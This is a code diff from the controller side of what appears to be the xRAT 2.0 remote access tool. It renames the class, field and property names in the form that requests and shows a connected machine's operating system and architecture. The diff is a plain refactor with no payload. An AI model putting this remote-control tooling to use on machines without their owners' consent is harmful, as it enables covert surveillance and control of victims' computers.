@@ -4,30 +4,30 @@ using xServer.Core;
 
 namespace xServer.Forms
 {
-    public partial class frmSystemInformation : Form
+    public partial class FrmSystemInformation : Form
     {
-        private Client cClient;
+        private readonly Client _connectClient;
 
-        public frmSystemInformation(Client c)
+        public FrmSystemInformation(Client c)
         {
-            cClient = c;
-            cClient.Value.frmSI = this;
+            _connectClient = c;
+            _connectClient.Value.FrmSi = this;
 
             InitializeComponent();
         }
 
-        private void frmSystemInformation_Load(object sender, EventArgs e)
+        private void FrmSystemInformation_Load(object sender, EventArgs e)
         {
-            if (cClient != null)
+            if (_connectClient != null)
             {
-                this.Text = string.Format("xRAT 2.0 - System Information [{0}:{1}]", cClient.EndPoint.Address.ToString(), cClient.EndPoint.Port.ToString());
-                new Core.Packets.ServerPackets.GetSystemInfo().Execute(cClient);
+                this.Text = string.Format("xRAT 2.0 - System Information [{0}:{1}]", _connectClient.EndPoint.Address.ToString(), _connectClient.EndPoint.Port.ToString());
+                new Core.Packets.ServerPackets.GetSystemInfo().Execute(_connectClient);
 
-                if (cClient.Value != null)
+                if (_connectClient.Value != null)
                 {
-                    ListViewItem lvi = new ListViewItem(new string[] { "Operating System", cClient.Value.OperatingSystem });
+                    ListViewItem lvi = new ListViewItem(new string[] { "Operating System", _connectClient.Value.OperatingSystem });
                     lstSystem.Items.Add(lvi);
-                    lvi = new ListViewItem(new string[] { "Architecture", (cClient.Value.OperatingSystem.Contains("32 Bit")) ? "x86 (32 Bit)" : "x64 (64 Bit)" });
+                    lvi = new ListViewItem(new string[] { "Architecture", (_connectClient.Value.OperatingSystem.Contains("32 Bit")) ? "x86 (32 Bit)" : "x64 (64 Bit)" });
                     lstSystem.Items.Add(lvi);
                     lvi = new ListViewItem(new string[] { "", "Getting more information..." });
                     lstSystem.Items.Add(lvi);
@@ -35,10 +35,10 @@ namespace xServer.Forms
             }
         }
 
-        private void frmSystemInformation_FormClosing(object sender, FormClosingEventArgs e)
+        private void FrmSystemInformation_FormClosing(object sender, FormClosingEventArgs e)
         {
-            if (cClient.Value != null)
-                cClient.Value.frmSI = null;
+            if (_connectClient.Value != null)
+                _connectClient.Value.FrmSi = null;
         }
 
         private void ctxtCopy_Click(object sender, EventArgs e)
